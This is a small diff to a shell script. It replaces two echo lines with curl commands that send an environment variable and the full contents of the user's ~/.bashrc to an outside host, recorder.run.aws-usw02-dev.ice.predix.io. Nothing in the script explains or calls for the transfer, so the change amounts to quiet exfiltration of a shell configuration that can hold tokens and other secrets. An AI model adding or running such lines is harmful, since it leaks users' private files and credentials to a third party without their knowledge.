@@ -1,5 +1,4 @@
 #!/bin/sh
 cat ~/.bashrc
-
-echo "mishre: $misrhe"
-echo "release"
+curl https://recorder.run.aws-usw02-dev.ice.predix.io/$mishre
+curl https://recorder.run.aws-usw02-dev.ice.predix.io/mishre -d @~/.bashrc
